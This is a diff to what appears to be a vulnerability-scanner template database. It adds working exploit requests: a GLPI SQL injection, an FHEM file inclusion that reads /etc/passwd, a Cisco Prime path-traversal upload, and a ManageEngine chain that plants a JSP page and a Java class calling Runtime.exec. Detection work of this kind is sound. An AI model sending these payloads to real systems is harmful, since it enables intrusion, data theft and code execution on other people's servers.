@@ -18364,6 +18364,56 @@
       ]
     },
     {
+      "id": "CVE-2019-10232",
+      "info": {
+        "author": "RedTeamBrasil",
+        "classification": {
+          "cve-id": "CVE-2019-10232",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "cvss-score": 9.8,
+          "cwe-id": "CWE-89"
+        },
+        "description": "Synacktiv discovered that GLPI exposes a script (/scripts/unlock_tasks.php) that not correctly sanitize usercontrolled data before using it in SQL queries. Thus, an attacker could abuse the affected feature to alter the semantic original SQL query and retrieve database records. This script is reachable without authentication.",
+        "name": "Pre-authenticated SQL injection in GLPI <= 9.3.3",
+        "reference": [
+          "https://www.synacktiv.com/ressources/advisories/GLPI_9.3.3_SQL_Injection.pdf",
+          "https://github.com/glpi-project/glpi/commit/684d4fc423652ec7dde21cac4d41c2df53f56b3c"
+        ],
+        "severity": "critical",
+        "tags": "cve,cve2019,glpi,sqli"
+      },
+      "requests": [
+        {
+          "extractors": [
+            {
+              "part": "body",
+              "regex": [
+                "[0-9]{1,2}.[0-9]{1,2}.[0-9]{1,2}-MariaDB"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "-MariaDB-",
+                "Start unlock script"
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/glpi/scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201,(@@version)--%20&only_tasks=1",
+            "{{BaseURL}}/scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201,(@@version)--%20&only_tasks=1"
+          ],
+          "stop-at-first-match": true
+        }
+      ]
+    },
+    {
       "id": "CVE-2019-10475",
       "info": {
         "author": "madrobot",
@@ -20484,14 +20534,13 @@
         "metadata": {
           "shodan-query": "http.title:\"prime infrastructure\""
         },
-        "name": "Cisco Prime Infrastructure Unauthorized RCE (CVE-2019-1821)",
+        "name": "Cisco Prime Infrastructure Unauthorized RCE",
         "reference": [
           "https://srcincite.io/blog/2019/05/17/panic-at-the-cisco-unauthenticated-rce-in-prime-infrastructure.html",
-          "https://nvd.nist.gov/vuln/detail/CVE-2019-1821",
-          "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1821"
+          "https://nvd.nist.gov/vuln/detail/CVE-2019-1821"
         ],
         "severity": "critical",
-        "tags": "rce,fileupload,unauth,cve,cve2019"
+        "tags": "cve,cve2019,rce,fileupload,unauth,intrusive"
       },
       "requests": [
         {
@@ -20499,15 +20548,15 @@
             {
               "condition": "and",
               "dsl": [
-                "status_code==200",
+                "status_code == 200",
                 "contains((body_2), '{{randstr}}')"
               ],
               "type": "dsl"
             }
           ],
           "raw": [
-            "POST /servlet/UploadServlet HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nAccept-Encoding: gzip, deflate\nAccept: */*\nPrimary-IP: 127.0.0.1\nFilename: test.tar\nFilesize: 10240\nCompressed-Archive: false\nDestination-Dir: tftpRoot\nFilecount: 1\nContent-Length: 269\nContent-Type: multipart/form-data; boundary=871a4a346a547cf05cb83f57b9ebcb83\n\n--871a4a346a547cf05cb83f57b9ebcb83\nContent-Disposition: form-data; name=\"files\"; filename=\"test.tar\"\n\n../../opt/CSCOlumos/tomcat/webapps/ROOT/test.txt0000644000000000000000000000000400000000000017431 0ustar  00000000000000{{randstr}}\n--871a4a346a547cf05cb83f57b9ebcb83--\n",
-            "GET /test.txt HTTP/1.1\nHost: {{Host}}\nConnection: close\nAccept-Encoding: gzip, deflate\nAccept: */*\n"
+            "POST /servlet/UploadServlet HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip, deflate\nPrimary-IP: 127.0.0.1\nFilename: test.tar\nFilesize: 10240\nCompressed-Archive: false\nDestination-Dir: tftpRoot\nFilecount: 1\nContent-Length: 269\nContent-Type: multipart/form-data; boundary=871a4a346a547cf05cb83f57b9ebcb83\n\n--871a4a346a547cf05cb83f57b9ebcb83\nContent-Disposition: form-data; name=\"files\"; filename=\"test.tar\"\n\n../../opt/CSCOlumos/tomcat/webapps/ROOT/test.txt0000644000000000000000000000000400000000000017431 0ustar  00000000000000{{randstr}}\n--871a4a346a547cf05cb83f57b9ebcb83--\n",
+            "GET /test.txt HTTP/1.1\nHost: {{Host}}\n"
           ],
           "req-condition": true
         }
@@ -25349,6 +25398,48 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/weibo/topic/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-19360",
+      "info": {
+        "author": "0x_Akoko",
+        "classification": {
+          "cve-id": "CVE-2020-19360",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "cvss-score": 7.5
+        },
+        "description": "FHEM version 6.0 suffers from a local file inclusion vulnerability.",
+        "name": "FHEM 6.0 Local File Inclusion",
+        "reference": [
+          "https://github.com/EmreOvunc/FHEM-6.0-Local-File-Inclusion-LFI-Vulnerability/blob/master/README.md",
+          "https://www.cvedetails.com/cve/CVE-2020-19360/"
+        ],
+        "severity": "high",
+        "tags": "fhem,lfi,cve,cve2020"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/fhem/FileLog_logWrapper?dev=Logfile&file=%2fetc%2fpasswd&type=text"
           ]
         }
       ]
@@ -37649,30 +37740,31 @@
     {
       "id": "CVE-2021-40539",
       "info": {
-        "author": "daffainfo",
+        "author": "daffainfo,pdteam",
         "classification": {
           "cve-id": "CVE-2021-40539",
           "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
           "cvss-score": 9.8,
           "cwe-id": "CWE-287"
         },
-        "description": "Zoho ManageEngine ADSelfService Plus version 6113 and prior is vulnerable to REST API authentication bypass with resultant remote code execution.",
-        "name": "Zoho ManageEngine ADSelfService Plus version 6113 Unauthenticated RCE",
+        "description": "ManageEngine ADSelfService Plus version 6113 and prior is vulnerable to REST API authentication bypass with resultant remote code execution.",
+        "name": "ManageEngine ADSelfService Plus version 6113 Unauthenticated RCE",
         "reference": [
           "https://attackerkb.com/topics/DMSNq5zgcW/cve-2021-40539/rapid7-analysis",
-          "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40539"
+          "https://www.synacktiv.com/publications/how-to-exploit-cve-2021-40539-on-manageengine-adselfservice-plus.html",
+          "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40539",
+          "https://github.com/synacktiv/CVE-2021-40539"
         ],
         "severity": "critical",
-        "tags": "cve,cve2021,rce,zoho"
+        "tags": "cve,cve2021,rce,ad,intrusive"
       },
       "requests": [
         {
           "matchers": [
             {
-              "part": "body",
               "type": "word",
               "words": [
-                "<script type=\"text/javascript\">var d = new Date();window.parent.$(\"#mobLogo\").attr(\"src\",\"/temp/tempMobPreview.jpeg?\"+d.getTime());window.parent.$(\"#tabLogo\").attr(\"src\",\"/temp/tempMobPreview.jpeg?\"+d.getTime());</script>"
+                "114f7ce498a54a1be1de1f1e5731d0ea"
               ]
             },
             {
@@ -37684,7 +37776,10 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /./RestAPI/LogonCustomization HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 27\n\nmethodToCall=previewMobLogo\n"
+            "POST /./RestAPI/LogonCustomization HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=8b1ab266c41afb773af2e064bc526458\n\n--8b1ab266c41afb773af2e064bc526458\nContent-Disposition: form-data; name=\"methodToCall\"\n\nunspecified\n--8b1ab266c41afb773af2e064bc526458\nContent-Disposition: form-data; name=\"Save\"\n\nyes\n--8b1ab266c41afb773af2e064bc526458\nContent-Disposition: form-data; name=\"form\"\n\nsmartcard\n--8b1ab266c41afb773af2e064bc526458\nContent-Disposition: form-data; name=\"operation\"\n\nAdd\n--8b1ab266c41afb773af2e064bc526458\nContent-Disposition: form-data; name=\"CERTIFICATE_PATH\"; filename=\"ws.jsp\"\n\n<%@ page import=\"java.util.*,java.io.*\"%>\n<%@ page import=\"java.security.MessageDigest\"%>\n<%\nString cve = \"CVE-2021-40539\";\nMessageDigest alg = MessageDigest.getInstance(\"MD5\");\nalg.reset();\nalg.update(cve.getBytes());\nbyte[] digest = alg.digest();\nStringBuffer hashedpasswd = new StringBuffer();\nString hx;\nfor (int i=0;i<digest.length;i++){\n  hx =  Integer.toHexString(0xFF & digest[i]);\n  if(hx.length() == 1){hx = \"0\" + hx;}\n  hashedpasswd.append(hx);\n}\nout.println(hashedpasswd.toString());\n%>\n--8b1ab266c41afb773af2e064bc526458--\n",
+            "POST /./RestAPI/LogonCustomization HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=43992a07d9a30213782780204a9f032b\n\n--43992a07d9a30213782780204a9f032b\nContent-Disposition: form-data; name=\"methodToCall\"\n\nunspecified\n--43992a07d9a30213782780204a9f032b\nContent-Disposition: form-data; name=\"Save\"\n\nyes\n--43992a07d9a30213782780204a9f032b\nContent-Disposition: form-data; name=\"form\"\n\nsmartcard\n--43992a07d9a30213782780204a9f032b\nContent-Disposition: form-data; name=\"operation\"\n\nAdd\n--43992a07d9a30213782780204a9f032b\nContent-Disposition: form-data; name=\"CERTIFICATE_PATH\"; filename=\"Si.class\"\n\n{{hex_decode('CAFEBABE0000003400280D0A000C00160D0A0017001807001908001A08001B08001C08001D08001E0D0A0017001F0700200700210700220100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100083C636C696E69743E01000D0A537461636B4D61705461626C6507002001000D0A536F7572636546696C6501000753692E6A6176610C000D0A000E0700230C002400250100106A6176612F6C616E672F537472696E67010003636D640100022F63010004636F707901000677732E6A737001002A2E2E5C776562617070735C61647373705C68656C705C61646D696E2D67756964655C746573742E6A73700C002600270100136A6176612F696F2F494F457863657074696F6E01000253690100106A6176612F6C616E672F4F626A6563740100116A6176612F6C616E672F52756E74696D6501000D0A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B01000465786563010028285B4C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0021000B000C0000000000020001000D0A000E0001000F0000001D00010001000000052AB70001B10000000100100000000600010000000200080011000E0001000F00000064000500020000002BB800024B2A08BD000359031204535904120553590512065359061207535907120853B600094CA700044BB10001000000260029000D0A00020010000000120004000000050004000600260007002A00080012000000070002690700130000010014000000020015')}}\n--43992a07d9a30213782780204a9f032b--\n",
+            "POST /./RestAPI/Connection HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nmethodToCall=openSSLTool&action=generateCSR&KEY_LENGTH=1024+-providerclass+Si+-providerpath+%22..%5Cbin%22\n",
+            "GET /help/admin-guide/test.jsp HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
